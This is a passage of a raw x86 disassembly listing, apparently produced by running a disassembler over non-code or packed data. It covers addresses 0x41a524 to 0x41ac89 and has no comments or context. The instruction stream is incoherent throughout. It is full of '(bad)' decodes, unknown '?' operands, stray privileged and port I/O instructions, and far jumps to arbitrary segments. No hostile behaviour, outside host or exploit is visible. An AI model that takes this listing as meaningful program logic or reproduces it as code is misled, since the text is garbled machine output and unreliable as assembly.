  41a524:	sub    edi,DWORD PTR [ebp+ebp*1+0x103415c]
  41a52b:	push   0x53c88060
  41a530:	add    bl,BYTE PTR [edi+ebx*8-0x49]
  41a534:	adc    eax,DWORD PTR [eax+eiz*8-0x4e9e62c]
  41a53b:	mov    ch,0xb
  41a53d:	mov    edi,0x8ae24e9f
  41a542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a543:	mov    DWORD PTR [eax-0x69],ebp
  41a546:	stc    
  41a547:	jmp    0x1d6edc56
  41a54c:	dec    ecx
  41a54d:	ret    0xa745
  41a550:	test   BYTE PTR [ebp-0x28d9fb57],al
  41a556:	cmc    
  41a557:	xchg   ebx,eax
  41a558:	xchg   ebx,eax
  41a559:	sti    
  41a55a:	sbb    eax,0x62a12047
  41a55f:	xlat   BYTE PTR ds:[ebx]
  41a560:	sub    DWORD PTR [edi-0x3a],edx
  41a563:	jae    0x41a572
  41a565:	xor    edi,ebx
  41a567:	es xor al,0x14
  41a56a:	push   0x4b
  41a56c:	int    0xe7
  41a56e:	fadd   DWORD PTR [ebx-0x9a11925]
  41a574:	icebp  
  41a575:	das    
  41a576:	jecxz  0x41a503
  41a578:	(bad)  
  41a579:	popa   
  41a57a:	fld    DWORD PTR [edi]
  41a57c:	ins    BYTE PTR es:[edi],dx
  41a57d:	fimul  WORD PTR [ecx+ecx*2]
  41a580:	not    BYTE PTR [edx-0x35066f01]
  41a586:	ss (bad) 
  41a588:	scas   al,BYTE PTR es:[edi]
  41a589:	jbe    0x41a55c
  41a58b:	inc    ebp
  41a58c:	ins    DWORD PTR es:[edi],dx
  41a58d:	loop   0x41a555
  41a58f:	fsubp  st(3),st
  41a591:	push   ds
  41a592:	mov    esp,0xda5746e6
  41a597:	or     bl,dh
  41a599:	imul   esp,edi,0x7f6aee59
  41a59f:	push   cs
  41a5a0:	shr    BYTE PTR [edi-0x27],1
  41a5a3:	in     al,0xf1
  41a5a5:	jbe    0x41a56c
  41a5a7:	lea    edi,[ebx+0x6e]
  41a5aa:	push   ebx
  41a5ab:	std    
  41a5ac:	xchg   ecx,eax
  41a5ad:	sub    esi,DWORD PTR [esi]
  41a5af:	mov    bh,0xb8
  41a5b1:	dec    ebx
  41a5b2:	mov    edi,0x1d51b8
  41a5b7:	mov    eax,ds:0x5f85e017
  41a5bc:	mov    ch,0x91
  41a5be:	pop    edi
  41a5bf:	shr    BYTE PTR [esi-0x80],cl
  41a5c2:	adc    eax,0x509ec11d
  41a5c7:	inc    esp
  41a5c8:	fdiv   QWORD PTR [ecx]
  41a5ca:	imul   ebx,DWORD PTR [ecx],0x38
  41a5cd:	mov    cl,0xa3
  41a5cf:	mov    ds:0xa7452653,eax
  41a5d4:	cdq    
  41a5d5:	gs or  dh,al
  41a5d8:	xor    al,0x7b
  41a5da:	dec    esi
  41a5db:	pusha  
  41a5dc:	jg     0x41a5c0
  41a5de:	lock sbb BYTE PTR [ecx-0x18],al
  41a5e2:	mov    edx,0xfa8a4df6
  41a5e7:	sti    
  41a5e8:	mov    ebp,0x24cc1eef
  41a5ed:	jne    0x41a5a3
  41a5ef:	lock add cl,cl
  41a5f2:	jge    0x41a58c
  41a5f4:	mov    ebp,0x49b1a85b
  41a5f9:	lock mov esp,0x9d492dba
  41a5ff:	mov    WORD PTR [esi+0x71],?
  41a602:	arpl   WORD PTR [edx+0x37e64f20],ax
  41a608:	mov    cl,0xc2
  41a60a:	cli    
  41a60b:	jb     0x41a5f1
  41a60d:	jns    0x41a5bb
  41a60f:	leave  
  41a610:	sub    dh,BYTE PTR [ebx-0x6e]
  41a613:	gs je  0x41a5b2
  41a616:	gs sub al,0xc9
  41a619:	adc    eax,0x54f61512
  41a61e:	push   esi
  41a61f:	in     eax,0x5d
  41a621:	dec    edx
  41a622:	dec    ebp
  41a623:	ret    0xe98c
  41a626:	mov    BYTE PTR [esi+0x5c],dh
  41a629:	mov    ds:0xa14782ba,al
  41a62e:	inc    esp
  41a62f:	push   es
  41a630:	mov    ecx,0x3991f506
  41a635:	jge    0x41a604
  41a637:	test   eax,0x8743b375
  41a63c:	dec    ebx
  41a63d:	jne    0x41a5dc
  41a63f:	test   eax,0x31068ad1
  41a644:	dec    ebx
  41a645:	xlat   BYTE PTR ds:[ebx]
  41a646:	push   ecx
  41a647:	mov    ?,WORD PTR [edx]
  41a649:	xchg   BYTE PTR [edx-0x19a64b90],bh
  41a64f:	pop    eax
  41a650:	outs   dx,DWORD PTR ds:[esi]
  41a651:	xchg   edx,eax
  41a652:	inc    ebp
  41a653:	dec    ebp
  41a654:	stc    
  41a655:	fwait
  41a656:	dec    ecx
  41a657:	push   eax
  41a658:	dec    esi
  41a659:	xchg   esp,eax
  41a65a:	and    eax,0x956e3634
  41a65f:	mov    ecx,0x77cfa7fc
  41a664:	pop    esi
  41a665:	(bad)
  41a668:	mov    edx,0xa560fdfa
  41a66d:	das    
  41a66e:	outs   dx,BYTE PTR ds:[esi]
  41a66f:	retf   
  41a670:	retf   
  41a671:	push   eax
  41a672:	sub    bh,BYTE PTR [eax]
  41a674:	mov    ?,WORD PTR [edi+ecx*4+0x6c]
  41a678:	ds sti 
  41a67a:	popa   
  41a67b:	xor    al,0x46
  41a67d:	shl    BYTE PTR [ebx],cl
  41a67f:	clc    
  41a680:	(bad)
  41a684:	test   al,0xd0
  41a686:	pushf  
  41a687:	xor    edx,esp
  41a689:	imul   esi,ebp,0x84d5dbdf
  41a68f:	sar    BYTE PTR [ebp-0x34],0x6
  41a693:	iret   
  41a694:	xchg   ebp,eax
  41a695:	adc    eax,0x91469161
  41a69a:	mov    esp,es
  41a69c:	std    
  41a69d:	jmp    0xf6719e14
  41a6a2:	push   edx
  41a6a3:	cmp    BYTE PTR [ebx-0x25],0x80
  41a6a7:	jno    0x41a6be
  41a6a9:	mul    BYTE PTR [esi+0x28]
  41a6ac:	stc    
  41a6ad:	mov    edx,0xae94461b
  41a6b2:	cdq    
  41a6b3:	or     edi,DWORD PTR ds:0x4c46097
  41a6b9:	inc    ecx
  41a6ba:	xor    BYTE PTR [esi],dh
  41a6bc:	sbb    bh,BYTE PTR [edi]
  41a6be:	dec    ebp
  41a6bf:	mov    eax,0xd2496cc2
  41a6c4:	cmp    al,0x98
  41a6c6:	out    dx,al
  41a6c7:	pop    edx
  41a6c8:	or     edx,DWORD PTR [eax]
  41a6ca:	mov    dh,0xa7
  41a6cc:	jae    0x41a71a
  41a6ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6cf:	push   ss
  41a6d0:	aad    0xf8
  41a6d2:	push   ebx
  41a6d3:	fld    QWORD PTR ds:0xa1b81cf3
  41a6d9:	jmp    0xc8c6dfaa
  41a6de:	dec    edx
  41a6df:	sti    
  41a6e0:	jmp    0xe12eece0
  41a6e5:	pop    edx
  41a6e6:	fisttp WORD PTR [edx-0x38]
  41a6e9:	cwde   
  41a6ea:	inc    edx
  41a6eb:	call   0x8140d563
  41a6f0:	loopne 0x41a727
  41a6f2:	retf   
  41a6f3:	jno    0x41a768
  41a6f5:	out    0x7f,eax
  41a6f7:	inc    edi
  41a6f8:	lods   al,BYTE PTR ds:[esi]
  41a6f9:	jns    0x41a6b1
  41a6fb:	jae    0x41a6a1
  41a6fd:	sbb    eax,0xb75f253e
  41a702:	mov    ebp,0x22987efb
  41a707:	shl    BYTE PTR [ebx],1
  41a709:	cwde   
  41a70a:	and    eax,0xa683894f
  41a70f:	dec    ebp
  41a710:	popa   
  41a711:	push   0xffffff84
  41a713:	dec    ebp
  41a714:	inc    eax
  41a715:	sbb    bl,BYTE PTR ds:0xfb480ae0
  41a71b:	xchg   ebp,eax
  41a71c:	inc    eax
  41a71d:	pop    esi
  41a71e:	dec    eax
  41a71f:	push   ebx
  41a720:	sub    eax,0x519c4b9f
  41a725:	push   0x2f5a1827
  41a72a:	stc    
  41a72b:	add    esi,ecx
  41a72d:	retf   
  41a72e:	xor    DWORD PTR [esp+ebx*4+0x24],esp
  41a732:	mov    edi,0x89d8e070
  41a737:	mov    dl,dl
  41a739:	sub    eax,DWORD PTR [ebp-0x3ade6784]
  41a73f:	jns    0x41a7aa
  41a741:	mov    ?,WORD PTR ds:0xbcc76058
  41a747:	mov    bh,0x52
  41a749:	ins    DWORD PTR es:[edi],dx
  41a74a:	and    al,0x3e
  41a74c:	imul   edi,DWORD PTR [esi],0xa94d5616
  41a752:	popf   
  41a753:	xchg   edi,eax
  41a754:	addr16 or al,0xd9
  41a757:	push   ss
  41a758:	mov    ecx,0x278b3444
  41a75d:	hlt    
  41a75e:	jbe    0x41a748
  41a760:	aad    0x6b
  41a762:	retf   
  41a763:	dec    ecx
  41a764:	adc    esi,ecx
  41a766:	mov    bh,0xe0
  41a768:	pop    edx
  41a769:	(bad)  
  41a76a:	jmp    0x41a716
  41a76c:	push   0xd6bfabf1
  41a771:	not    DWORD PTR [ebp+0x3ba7c965]
  41a777:	not    cl
  41a779:	mov    dh,0x93
  41a77b:	xor    BYTE PTR [eax],0x7d
  41a77e:	pop    eax
  41a77f:	js     0x41a798
  41a781:	aad    0x3b
  41a783:	mov    DWORD PTR [esi+0x42],ecx
  41a786:	mov    ebx,DWORD PTR [ecx+0x60b44f7b]
  41a78c:	sub    eax,0x3cf79881
  41a791:	dec    ebx
  41a792:	icebp  
  41a793:	jp     0x41a797
  41a795:	sub    dl,BYTE PTR ds:0xc4990afd
  41a79b:	mov    eax,0x990a5034
  41a7a0:	add    al,0xa0
  41a7a2:	fwait
  41a7a3:	cmovle edi,DWORD PTR [eax]
  41a7a6:	or     bh,BYTE PTR [edi-0x1a]
  41a7a9:	or     cl,al
  41a7ab:	mov    eax,ds:0xd61757
  41a7b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7b1:	and    al,0x58
  41a7b3:	adc    ecx,DWORD PTR [edi+0x2d9b7697]
  41a7b9:	ret    
  41a7ba:	jns    0x41a7b0
  41a7bc:	sub    eax,0x4a2d7117
  41a7c1:	loopne 0x41a759
  41a7c3:	call   0xce88deb3
  41a7c8:	int    0xac
  41a7ca:	cmp    al,0xda
  41a7cc:	mov    bh,0xfc
  41a7ce:	out    0xe8,eax
  41a7d0:	gs pop ebp
  41a7d2:	stos   DWORD PTR es:[edi],eax
  41a7d3:	retf   
  41a7d4:	retf   0xc83d
  41a7d7:	xchg   ebx,eax
  41a7d8:	xchg   ebx,eax
  41a7d9:	cmp    eax,0x75e75eca
  41a7de:	mov    esi,0x7dd81a55
  41a7e3:	int3   
  41a7e4:	js     0x41a82f
  41a7e6:	xchg   esi,eax
  41a7e7:	arpl   di,si
  41a7e9:	and    al,0x92
  41a7eb:	rcl    al,0xd0
  41a7ee:	push   esp
  41a7ef:	aam    0xdb
  41a7f1:	pop    edx
  41a7f2:	cmp    bh,bl
  41a7f4:	ja     0x41a7bb
  41a7f6:	push   esp
  41a7f7:	dec    ebp
  41a7f8:	out    dx,al
  41a7f9:	dec    edx
  41a7fa:	lods   eax,DWORD PTR ds:[esi]
  41a7fb:	adc    eax,0x28f7de98
  41a800:	hlt    
  41a801:	cmovbe eax,DWORD PTR [ebx]
  41a804:	or     BYTE PTR [eax+0x51d1a315],bl
  41a80a:	dec    ebx
  41a80b:	xchg   ebp,eax
  41a80c:	aad    0x5c
  41a80e:	push   0xffffffb1
  41a810:	xor    ah,BYTE PTR [edx-0x70003a7e]
  41a816:	sar    al,0x71
  41a819:	or     eax,0x428d3d5b
  41a81e:	ret    
  41a81f:	pop    esp
  41a820:	stos   BYTE PTR es:[edi],al
  41a821:	pusha  
  41a822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a823:	inc    esp
  41a824:	(bad)  
  41a825:	int    0x5a
  41a827:	xor    ch,BYTE PTR [edx-0x625c4c73]
  41a82d:	shr    dl,cl
  41a82f:	mov    ch,0x12
  41a831:	clc    
  41a832:	xlat   BYTE PTR ds:[ebx]
  41a833:	bound  edx,QWORD PTR [ecx+esi*8-0x42db23c]
  41a83a:	mov    al,0x74
  41a83c:	mov    BYTE PTR [eax+edx*2+0x5e05eb90],ch
  41a843:	(bad)  
  41a844:	sti    
  41a845:	push   edx
  41a846:	xchg   esi,eax
  41a847:	ja     0x41a80c
  41a849:	loop   0x41a874
  41a84b:	shl    DWORD PTR [esi+0x5c84a473],cl
  41a851:	lods   eax,DWORD PTR ds:[esi]
  41a852:	scas   al,BYTE PTR es:[edi]
  41a853:	es inc ecx
  41a855:	fbld   TBYTE PTR [esi+0x1e]
  41a858:	pop    ss
  41a859:	stos   DWORD PTR es:[edi],eax
  41a85a:	es scas al,BYTE PTR es:[edi]
  41a85c:	icebp  
  41a85d:	ret    
  41a85e:	mov    ebx,0x804e73fc
  41a863:	push   cs
  41a864:	test   al,0x86
  41a866:	mov    ds:0xaedaf4a7,al
  41a86b:	or     eax,0x7b7b9629
  41a870:	ret    
  41a871:	inc    ebp
  41a872:	push   es
  41a873:	in     eax,dx
  41a874:	push   ebx
  41a875:	pop    esi
  41a876:	push   cs
  41a877:	adc    esp,0xe2ab4b2b
  41a87d:	xchg   ch,ah
  41a87f:	cli    
  41a880:	add    eax,0x876de51f
  41a885:	cdq    
  41a886:	cmc    
  41a887:	add    cl,ah
  41a889:	mov    es,WORD PTR [esi-0x36]
  41a88c:	or     BYTE PTR [edi-0x39c5d888],bh
  41a892:	mov    ecx,ebp
  41a894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a895:	cmp    edi,edi
  41a897:	or     eax,0xbb52da6b
  41a89c:	test   al,0x63
  41a89e:	leave  
  41a89f:	hlt    
  41a8a0:	add    DWORD PTR [ebx+0x5a],edx
  41a8a3:	sar    DWORD PTR [ebx-0x24c4358e],cl
  41a8a9:	(bad)  
  41a8aa:	sbb    al,0xcf
  41a8ac:	pop    ebp
  41a8ad:	js     0x41a86c
  41a8af:	pop    ds
  41a8b0:	gs dec esp
  41a8b2:	es xchg edi,eax
  41a8b4:	xor    ebx,ecx
  41a8b6:	popf   
  41a8b7:	es das 
  41a8b9:	cmc    
  41a8ba:	pop    esi
  41a8bb:	sbb    ah,dh
  41a8bd:	push   ss
  41a8be:	cli    
  41a8bf:	adc    dl,BYTE PTR [esi]
  41a8c1:	or     eax,0xab2ee28e
  41a8c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8c7:	or     bh,BYTE PTR [ebx]
  41a8c9:	aad    0x56
  41a8cb:	push   cs
  41a8cc:	push   ds
  41a8cd:	dec    ebp
  41a8ce:	js     0x41a8f1
  41a8d0:	xor    dh,ch
  41a8d2:	and    ecx,DWORD PTR [edi-0x7a]
  41a8d5:	pop    es
  41a8d6:	lods   eax,DWORD PTR ds:[esi]
  41a8d7:	hlt    
  41a8d8:	scas   al,BYTE PTR es:[edi]
  41a8d9:	inc    edx
  41a8da:	inc    edx
  41a8db:	nop
  41a8dc:	retf   0x79b4
  41a8df:	in     eax,dx
  41a8e0:	add    al,0x72
  41a8e3:	call   FWORD PTR ds:0x4b69bb72
  41a8e9:	nop
  41a8ea:	dec    ebx
  41a8eb:	cmp    al,0xbf
  41a8ed:	int    0x35
  41a8ef:	mov    bh,0xe2
  41a8f1:	mov    dl,0xe6
  41a8f3:	sar    ebx,1
  41a8f5:	add    eax,0xe2070f69
  41a8fa:	cs push 0x4d
  41a8fd:	inc    ebx
  41a8fe:	jmp    0x7f50:0x9e15905c
  41a905:	mov    ds,WORD PTR [esi]
  41a907:	push   esi
  41a908:	jmp    0x9bd4:0x48cdbebc
  41a90f:	mov    dh,0xb
  41a911:	icebp  
  41a912:	mov    DWORD PTR [esi-0x2326965f],ecx
  41a918:	push   edi
  41a919:	dec    ebx
  41a91a:	sar    DWORD PTR [edi-0x67],cl
  41a91d:	pop    esp
  41a91e:	or     DWORD PTR [ecx-0x5a0ed999],esi
  41a924:	repz pusha 
  41a926:	mov    ds:0xa34130b5,al
  41a92b:	jp     0x41a9a3
  41a92d:	mov    ecx,0xd2f9bcbe
  41a932:	adc    ebp,DWORD PTR [esi-0x2c]
  41a935:	sbb    al,0x36
  41a937:	fnstsw WORD PTR [edi+0x93e631f]
  41a93d:	nop
  41a93e:	push   cs
  41a93f:	retf   
  41a940:	push   ebx
  41a941:	xor    BYTE PTR [ebx+0xa6c1f73],ah
  41a947:	outs   dx,DWORD PTR ds:[esi]
  41a948:	je     0x41a9b8
  41a94a:	mov    ebx,0x2953a276
  41a94f:	sub    eax,0xc8cbc9af
  41a954:	xor    edi,esi
  41a956:	or     al,BYTE PTR [ebx+0x0]
  41a959:	repnz mov ebx,DWORD PTR [edi]
  41a95c:	retf   0x6d40
  41a95f:	push   0xffffffca
  41a961:	call   0xe69b:0x12a56f79
  41a968:	xlat   BYTE PTR ds:[ebx]
  41a969:	aas    
  41a96a:	adc    eax,0x3cbe5fb1
  41a96f:	pusha  
  41a970:	std    
  41a971:	mov    DWORD PTR [esi],edx
  41a973:	iret   
  41a974:	mov    dl,0xfa
  41a976:	mov    ebx,0x4504d451
  41a97b:	cmp    ch,ah
  41a97d:	std    
  41a97e:	scas   al,BYTE PTR es:[edi]
  41a97f:	lock mov ah,dl
  41a982:	or     BYTE PTR [ebp-0x2e],ch
  41a985:	(bad)  
  41a986:	jnp    0x41a94f
  41a988:	dec    eax
  41a989:	cmp    cl,BYTE PTR [esi+eax*8-0x1d]
  41a98d:	lock xchg BYTE PTR [edx-0x2b],ch
  41a991:	mov    bh,0x6b
  41a993:	out    dx,eax
  41a994:	pop    edi
  41a995:	inc    ebp
  41a996:	lock xchg ebp,eax
  41a998:	inc    ebp
  41a999:	pop    eax
  41a99a:	xchg   ebx,eax
  41a99b:	jbe    0x41a94b
  41a99d:	ret    
  41a99e:	(bad)  
  41a9a0:	pusha  
  41a9a1:	jmp    0x62bac625
  41a9a6:	dec    ebp
  41a9a7:	ret    0xf02a
  41a9aa:	mov    ebp,0x1a7f34dc
  41a9af:	lea    ebp,[esi]
  41a9b1:	das    
  41a9b2:	inc    edx
  41a9b3:	xlat   BYTE PTR ds:[ebx]
  41a9b4:	loopne 0x41a9f2
  41a9b6:	ss mov cl,0x37
  41a9b9:	pop    eax
  41a9ba:	jo     0x41aa0a
  41a9bc:	jecxz  0x41aa35
  41a9be:	sbb    dh,BYTE PTR [ebp+edx*4+0x72]
  41a9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9c3:	jp     0x41aa24
  41a9c5:	mov    edi,0xf55eec05
  41a9ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9cb:	mov    eax,0x72e6817
  41a9d0:	cmp    dl,BYTE PTR [ebx]
  41a9d2:	cld    
  41a9d3:	je     0x41a97c
  41a9d5:	mov    ebx,0xa67f2df3
  41a9da:	(bad)  
  41a9dc:	into   
  41a9dd:	mov    bh,ah
  41a9df:	daa    
  41a9e0:	not    DWORD PTR [ecx-0x20ec77a1]
  41a9e6:	add    eax,0xd74f525d
  41a9eb:	add    eax,0xde39bc24
  41a9f0:	pop    esi
  41a9f1:	or     dh,BYTE PTR [ebp-0x8]
  41a9f4:	xchg   ecx,eax
  41a9f5:	mov    al,0x3e
  41a9f7:	jecxz  0x41aa42
  41a9f9:	stos   BYTE PTR es:[edi],al
  41a9fa:	sbb    BYTE PTR [ecx+edx*8+0x62],0x67
  41a9ff:	popa   
  41aa00:	inc    ebp
  41aa01:	adc    DWORD PTR [esi+0x2defe740],ebx
  41aa07:	(bad)  
  41aa08:	xor    al,bl
  41aa0a:	mov    bh,0x1f
  41aa0c:	inc    ebp
  41aa0d:	adc    BYTE PTR [edx],dl
  41aa0f:	ds inc ah
  41aa12:	repz jmp 0xee85:0xd63a84d6
  41aa1a:	retf   
  41aa1b:	dec    edi
  41aa1c:	fnstenv [ebp+0x652cf8dc]
  41aa22:	push   edx
  41aa23:	(bad)  
  41aa24:	sbb    bh,BYTE PTR [ecx+0x6c92628]
  41aa2a:	pop    ss
  41aa2b:	push   ss
  41aa2c:	xor    BYTE PTR [ebx+ecx*4+0x74],bl
  41aa30:	inc    edx
  41aa31:	add    BYTE PTR ds:0x393061ce,dh
  41aa37:	ss jne 0x41aaa1
  41aa3a:	ror    BYTE PTR [ecx-0x2],cl
  41aa3d:	cmp    cl,cl
  41aa3f:	daa    
  41aa40:	pop    ebx
  41aa41:	fimul  WORD PTR [edx]
  41aa43:	dec    edx
  41aa44:	scas   al,BYTE PTR es:[edi]
  41aa45:	mul    BYTE PTR [ecx+0x12]
  41aa48:	or     esi,ebp
  41aa4a:	mov    ds:0xbc96444a,al
  41aa4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa50:	sub    BYTE PTR [edx+0x52aec48f],bl
  41aa56:	pushf  
  41aa57:	cmp    al,0xf
  41aa59:	aas    
  41aa5a:	dec    esp
  41aa5b:	and    edi,DWORD PTR [edx-0x76]
  41aa5e:	cdq    
  41aa5f:	fnstsw WORD PTR [esi-0x37d58076]
  41aa65:	push   edi
  41aa66:	and    ebx,DWORD PTR [esi-0x5f822fec]
  41aa6c:	test   eax,0xe1bc0bc1
  41aa71:	mov    al,0x89
  41aa73:	cld    
  41aa74:	inc    ecx
  41aa75:	sub    esp,0x79
  41aa78:	(bad)  
  41aa7a:	fwait
  41aa7b:	iret   
  41aa7c:	push   esi
  41aa7d:	ds fs leave 
  41aa80:	in     eax,dx
  41aa81:	xor    eax,0x33d2aaad
  41aa86:	leave  
  41aa87:	adc    ebp,DWORD PTR [edi-0x16]
  41aa8a:	jo     0x41aa77
  41aa8c:	add    BYTE PTR [edx],dh
  41aa8e:	push   eax
  41aa8f:	jg     0x41aa79
  41aa91:	aaa    
  41aa92:	lods   al,BYTE PTR ds:[esi]
  41aa93:	adc    esi,DWORD PTR [eax+0x1e]
  41aa96:	in     eax,dx
  41aa97:	dec    edi
  41aa98:	fwait
  41aa99:	xor    BYTE PTR [ecx],ah
  41aa9b:	lock out 0x73,eax
  41aa9e:	daa    
  41aa9f:	mov    ax,0xbc55
  41aaa3:	pop    ecx
  41aaa4:	call   0x608a:0x7f3cb711
  41aaab:	and    DWORD PTR [ebp-0x67],ebx
  41aaae:	pusha  
  41aaaf:	mov    BYTE PTR [edx],ah
  41aab1:	xor    cl,ch
  41aab3:	cmc    
  41aab4:	or     al,0x8
  41aab6:	sbb    DWORD PTR [ebx-0x64],0x9fd6a9bc
  41aabd:	jl     0x41aac5
  41aabf:	popa   
  41aac0:	and    cl,ah
  41aac2:	mov    ebp,0x776c3ba9
  41aac7:	pushf  
  41aac8:	pop    esp
  41aac9:	in     al,0x88
  41aacb:	cld    
  41aacc:	mov    edx,0x1ff4f512
  41aad1:	pop    ebx
  41aad2:	sbb    ecx,DWORD PTR [ebx-0x7f9038cf]
  41aad8:	push   ss
  41aad9:	inc    ecx
  41aada:	std    
  41aadb:	xchg   ebp,eax
  41aadc:	int    0x13
  41aade:	adc    eax,0xd5f082c6
  41aae3:	sbb    bh,bh
  41aae5:	mov    cs,WORD PTR [ebx+0x1564a19d]
  41aaeb:	ret    
  41aaec:	xor    al,0x3b
  41aaee:	mov    ds:0x7851f81e,al
  41aaf3:	imul   eax,esi,0x16
  41aaf6:	jb     0x41ab38
  41aaf8:	pop    eax
  41aaf9:	(bad)  
  41aafa:	or     bh,cl
  41aafc:	dec    BYTE PTR [ecx-0x6ea6397]
  41ab02:	mov    eax,ds:0x8b7fabed
  41ab07:	pop    ss
  41ab08:	pop    ds
  41ab09:	dec    ebp
  41ab0a:	or     eax,0x66ca8a59
  41ab0f:	scas   eax,DWORD PTR es:[edi]
  41ab10:	ror    BYTE PTR [ebp-0x34],1
  41ab13:	out    dx,eax
  41ab14:	jp     0x41ab05
  41ab16:	sub    al,0x84
  41ab18:	pop    esi
  41ab19:	mov    al,0x8b
  41ab1b:	mov    esp,0x14d5481b
  41ab20:	pop    edx
  41ab21:	je     0x41aadf
  41ab23:	mov    ebx,0xf75849ca
  41ab28:	and    DWORD PTR [ebx+edx*8-0x51],ebx
  41ab2c:	xchg   BYTE PTR [ebp+0xf],dh
  41ab2f:	sub    ebp,ecx
  41ab31:	pushaw 
  41ab33:	push   es
  41ab34:	mov    esp,0x63928727
  41ab39:	xchg   edx,eax
  41ab3a:	push   ds
  41ab3b:	jae    0x41ab23
  41ab3d:	std    
  41ab3e:	pushf  
  41ab3f:	sbb    ch,BYTE PTR [eax]
  41ab41:	push   esi
  41ab42:	adc    al,0x97
  41ab44:	pop    edx
  41ab45:	mov    ebx,DWORD PTR [edi]
  41ab47:	jae    0x41aba2
  41ab49:	fisubr DWORD PTR [eax-0x7c3bd4de]
  41ab4f:	mov    ebp,0x8900f6d8
  41ab54:	xchg   esp,eax
  41ab55:	pop    ds
  41ab56:	jmp    0x89cb7b5e
  41ab5b:	pop    es
  41ab5c:	mov    esp,0xafa39aff
  41ab61:	mov    eax,0x834e099e
  41ab66:	jnp    0x41ab1c
  41ab68:	popa   
  41ab69:	mov    ah,0xd5
  41ab6b:	or     eax,0x9cafd438
  41ab70:	jl     0x41aafe
  41ab72:	mov    bl,BYTE PTR [eax]
  41ab74:	xchg   ebp,eax
  41ab75:	push   ds
  41ab76:	ins    BYTE PTR es:[edi],dx
  41ab77:	and    DWORD PTR [edi+0x3b6a5baf],edi
  41ab7d:	add    al,0xde
  41ab7f:	dec    edi
  41ab80:	inc    eax
  41ab81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab82:	or     eax,0xd56949a0
  41ab87:	xchg   esp,eax
  41ab88:	mov    edi,0xbdb14b3
  41ab8d:	out    0xa1,eax
  41ab8f:	xor    eax,0x21e0c889
  41ab94:	xchg   ebx,eax
  41ab95:	pop    esp
  41ab96:	int    0x9f
  41ab98:	mov    cl,0x48
  41ab9a:	mov    bl,0xd0
  41ab9c:	push   esp
  41ab9d:	out    dx,eax
  41ab9e:	outs   dx,DWORD PTR ds:[esi]
  41ab9f:	scas   eax,DWORD PTR es:[edi]
  41aba0:	jne    0x41abba
  41aba2:	(bad)  
  41aba3:	outs   dx,DWORD PTR ds:[esi]
  41aba4:	xlat   BYTE PTR ds:[ebx]
  41aba5:	add    edx,esi
  41aba7:	adc    BYTE PTR [ebx-0x2f],ah
  41abaa:	pop    eax
  41abab:	popa   
  41abac:	imul   esi,edx,0xfffffffa
  41abaf:	jl     0x41abc4
  41abb1:	adc    esi,DWORD PTR [edx]
  41abb3:	add    bh,ah
  41abb5:	jmp    0x71e854fb
  41abba:	leave  
  41abbb:	sbb    ch,BYTE PTR [ebx+0x799921f7]
  41abc1:	jo     0x41ab90
  41abc3:	loopne 0x41ab6d
  41abc5:	inc    ecx
  41abc6:	xor    eax,0x2be4ffd0
  41abcb:	xchg   edx,eax
  41abcc:	push   ecx
  41abcd:	jp     0x41ab98
  41abcf:	push   cs
  41abd0:	jl     0x41ac1d
  41abd2:	mov    WORD PTR [edi+ecx*4+0x2],cs
  41abd6:	mov    ds:0xfdc68cf2,eax
  41abdb:	xchg   edx,eax
  41abdc:	ret    0xfd2
  41abdf:	stos   DWORD PTR es:[edi],eax
  41abe0:	jns    0x41abe6
  41abe2:	sub    al,0x48
  41abe4:	jp     0x41ac57
  41abe6:	mov    dh,0xb4
  41abe8:	or     DWORD PTR [ecx-0x64],0xe4644350
  41abef:	test   al,0x95
  41abf1:	cmp    BYTE PTR [edx],0x89
  41abf4:	xchg   ecx,eax
  41abf5:	xchg   edi,eax
  41abf6:	xor    ecx,DWORD PTR [eax-0x55]
  41abf9:	imul   edx,DWORD PTR [esi],0xe5da78dd
  41abff:	jne    0x41abf7
  41ac01:	fistp  QWORD PTR [edx]
  41ac03:	lahf   
  41ac04:	icebp  
  41ac05:	int3   
  41ac06:	ins    DWORD PTR es:[edi],dx
  41ac07:	push   0xffffffc9
  41ac09:	fcmove st,st(2)
  41ac0b:	je     0x41abf5
  41ac0d:	enter  0xfff8,0x75
  41ac11:	pop    ds
  41ac12:	int3   
  41ac13:	mov    edi,0x6fbcf0a8
  41ac18:	mov    bh,0xef
  41ac1a:	adc    al,BYTE PTR [ebx+0xa]
  41ac1d:	(bad)  
  41ac1e:	retf   
  41ac1f:	sub    ebx,0x89d7a29
  41ac25:	xchg   ebx,eax
  41ac26:	sar    edi,1
  41ac28:	lahf   
  41ac29:	xchg   ebp,eax
  41ac2a:	push   edx
  41ac2b:	inc    esp
  41ac2c:	inc    ebx
  41ac2d:	mov    esp,0x4b4a10ba
  41ac32:	xor    BYTE PTR [ecx+0x410c3857],ah
  41ac38:	fldenv [eax+0x13]
  41ac3b:	test   BYTE PTR [esi+0x6b4b2ed],dh
  41ac41:	or     al,BYTE PTR [edi-0x26]
  41ac44:	(bad)  
  41ac46:	mov    ss,WORD PTR [esi]
  41ac48:	jle    0x41abeb
  41ac4a:	mov    dh,0x91
  41ac4c:	mov    DWORD PTR [ebp-0x1c],0xac4847d4
  41ac53:	cmp    ebx,DWORD PTR [eax-0x570f9f7f]
  41ac59:	push   edi
  41ac5a:	out    0x1d,eax
  41ac5c:	gs out dx,eax
  41ac5e:	or     esp,DWORD PTR [edi-0x4d397709]
  41ac64:	mov    ebx,0x7e89d3f9
  41ac69:	adc    al,0x8a
  41ac6b:	aaa    
  41ac6c:	fstp   QWORD PTR [eax]
  41ac6e:	fwait
  41ac6f:	addr16 push ds
  41ac71:	adc    DWORD PTR [eax+0x4b],eax
  41ac74:	mov    bl,BYTE PTR [ebx+ebx*2-0x31]
  41ac78:	loope  0x41ac24
  41ac7a:	or     eax,0x7e0fff47
  41ac7f:	(bad)  
  41ac80:	xor    BYTE PTR [esi+ecx*2+0x1a510084],cl
  41ac87:	ret    
  41ac88:	lods   eax,DWORD PTR ds:[esi]
  41ac89:	mov    eax,ds:0x7801350e
